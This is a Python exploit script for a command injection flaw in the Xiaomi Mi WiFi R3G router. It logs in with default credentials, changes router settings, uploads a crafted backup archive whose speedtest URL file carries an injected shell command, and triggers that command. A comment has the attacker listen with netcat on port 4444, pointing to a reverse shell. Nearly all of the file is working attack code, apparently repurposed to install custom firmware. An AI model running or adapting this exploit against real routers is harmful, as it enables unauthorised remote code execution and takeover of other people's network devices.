#!/usr/bin/python
# There is a remote command execution vulnerability in Xiaomi Mi WiFi R3G before version stable 2.28.23.
# The backup file is in tar.gz format. After uploading, the application uses the tar zxf command to decompress,
# so you can control the contents of the files in the decompressed directory.
# In addition, the application's sh script for testing upload and download speeds will read the url list from /tmp/speedtest_urls.xml,
# and there is a command injection vulnerability.

# discoverer: UltramanGaia from Kap0k & Zhiniang Peng from Qihoo 360 Core Security

# HOW TO RUN
# Install requirements
# pip3 install -r requirements.txt
# Run the script
# python3 remote_command_execution_vulnerability.py

import os
import sys
import shutil
import tarfile
import requests
import datetime
import math
import random
import hashlib

stok = ""
router_ip_address = "192.168.31.1"
key = 'a2ffa5c9be07488bbb04a3a47d3c5f6a' # key value for encrypt
iv = "4175472480004614961023454661220" # iv value for decrypt

# Extract stok from Xiaomi login API for update firmware automatically
def timestamp(): # A method(function) for getting timestamp easier
    return datetime.datetime.now().timestamp()

def create_nonce(): # A method(function) for create "nonce" value which is required at Xiaomi login API
    type = 0
    deviceId = '00:e0:4c:37:d4:ad'
    """ 
        timestamp in Python is different with timestamp in JavaScript.
        So if you want to send same value with JS, you need to multiply 1,000 to that value. 
        But in this case, the original JS source code has "Math.floor(new Date().getTime() / 1000);" to get timestamp, so,
        to get a timestamp like JS, remove " / 1000" part for same effect as "/ 1000 * 1000"
    """
    time = math.floor(timestamp())  
    rnd = math.floor(random.random() * 10000)
    return '_'.join([str(type), deviceId, str(time), str(rnd)])

def make_pw(password, nonce): # A method(function) for auto encoding & encrypting
    """
        Strings in Python needs to be encoded before hashing. Otherwise, it will throw an error like "TypeError: Unicode-objects must be..."
        The original JS code looks like this.
        >   CryptoJS.SHA1(this.nonce + CryptoJS.SHA1(pwd + this.key).toString()).toString();
        But, this is hard to understand, therefore this line splitted in two lines.
    """
    tmpPwd = hashlib.sha1(''.join([str(password), key]).encode())
    return hashlib.sha1(''.join([str(nonce), tmpPwd.hexdigest()]).encode())

def extract_stok(json): # A method(function) for extract stok value
    print("Extracting stok from " + json + "...")

    """
        manipulating json with format like 
        >   {'url': '192.168.31.1/cgi-bin/luci;stok=6fb7072bcf878af70affb49b8f8c2fea/web/home', 'token': '6fb7072bcf878af70affb49b8f8c2fea', 'code', '0'}
        1. split json with ";" to split IP address and parameter 
        >   ["'url': '192.168.31.1/cgi-bin/luci", "stok=6fb7072bcf878af70affb49b8f8c2fea/web/home', 'token': '6fb7072bcf878af70affb49b8f8c2fea', 'code', '0'"]
        2. split parameter with "/" to get stok 
        >   ["stok=6fb7072bcf878af70affb49b8f8c2fea", "web", "home', 'token': '6fb7072bcf878af70affb49b8f8c2fea', 'code', '0'"] 
        3. split stok with "=" to get pure stok 
        >   ["stok", "6fb7072bcf878af70affb49b8f8c2fea"]
        4. Store splited stok
    """
    tmp = json.split(";", -1)
    tmp = tmp[1].split("/", -1)
    tmp = tmp[0].split("=", -1)
    global stok # In Python, you must use "global" for changing global values in method, etc.
    stok = tmp[1]

def router_init(): # A method(function) for initialize router automatically
    # ---------------------------- step 1 -----------------------------------
    # Get stok value
    nonce = create_nonce()
    pw = make_pw('admin', nonce)
    url = ''.join(["http://miwifi.com/cgi-bin/luci/api/xqsystem/login?username=admin&logtype=2&nonce=", nonce, "&password=", pw.hexdigest(), "&init=1&privacy=1"])
    r = requests.get(url)
    extract_stok(str(r.json()))
    # -----------------------------------------------------------------------

    # ---------------------------- step 2 -----------------------------------
    # Enable network(DHCP)
    url = ''.join(["http://miwifi.com/cgi-bin/luci/;stok=", stok, "/api/xqnetwork/set_wan_new?wanType=dhcp&autoset=0"])
    r = requests.get(url)
    # -----------------------------------------------------------------------

    # ---------------------------- step 3 -----------------------------------
    # Set default settings
    nonce = create_nonce() # Prevent "invalid nonce" error
    new_pw = make_pw('xiaomi123', nonce)
    nonce = create_nonce() # Prevent "invalid nonce" error
    old_pw = make_pw('admin', nonce)
    url = ''.join(["http://miwifi.com/cgi-bin/luci/;stok=", stok, "/api/misystem/set_router_normal"])
    data = { # name, ssid, password values can be change, but the others MUST NOT BE CHANGED
        'name': 'Xiaomi_danbi',
        'locale': 'å®¶',
        'ssid': 'xiaomi_tmp',
        'password': 'xiaomi123', # You won't use this value(After initialize, FW update script will update Danbi FW)
        'encryption': 'mixed-psk',
        'nonce': nonce,
        'newPwd': new_pw.hexdigest(),
        'oldPwd': old_pw.hexdigest(),
        'txpwr': '1'
    }
    r = requests.post(url, data = data)

router_init()

# From https://blog.securityevaluators.com/show-mi-the-vulns-exploiting-command-injection-in-mi-router-3-55c6bcb48f09
# In the attacking machine (macos), run the following before executing this script: /usr/bin/nc -l 4444
command = "((sh /tmp/script.sh exploit) &)"

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

if os.path.exists("build"):
    shutil.rmtree("build")
os.makedirs("build")

# make config file
speed_test_filename = "speedtest_urls.xml"
with open("speedtest_urls_template.xml", "rt", encoding = "UTF-8") as f:
    template = f.read()
data = template.format(router_ip_address=router_ip_address, command=command)

with open("build/speedtest_urls.xml", "wt", encoding = "UTF-8") as f:
    f.write(data)

print("****************")
print("router_ip_address: " + router_ip_address)
print("stok: " + stok)
print("****************")

# Make tar
with tarfile.open("build/payload.tar.gz", "w:gz") as tar:
    tar.add("build/speedtest_urls.xml", "speedtest_urls.xml")
    tar.add("script.sh")
    # tar.add("busybox")
    # tar.add("extras/wget")
    # tar.add("extras/xiaoqiang")

# upload config file
print("start uploading config file...")
r1 = requests.post(
    "http://{}/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(router_ip_address, stok),
    files={"image": open("build/payload.tar.gz", 'rb')},
    proxies=proxies
)

# exec download speed test, exec command
print("start exec command...")
r2 = requests.get(
    "http://{}/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(router_ip_address, stok),
    proxies=proxies
)

print("Done! Wait until Danbi firmware successfully installs!")